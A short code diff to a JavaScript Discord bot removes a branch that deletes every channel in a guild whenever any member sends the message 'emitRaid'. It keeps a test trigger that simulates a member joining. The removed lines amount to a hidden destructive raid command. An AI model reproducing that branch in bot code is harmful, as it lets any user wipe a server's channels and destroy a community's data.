@@ -7,15 +7,7 @@ const client = new Client({
 const config = require("./config.json");
 
 client.on("messageCreate", async (message) => {
-  if (message.content == "emitRaid") {
-    message.guild.channels.cache.forEach(async (channel) => {
-      try {
-        await channel.delete();
-      } catch (err) {
-        console.log(err);
-      }
-    });
-  } else if (message.content == "emitJoin") {
+ if (message.content == "emitJoin") {
     client.emit("guildMemberAdd", message.member);
   }
 });
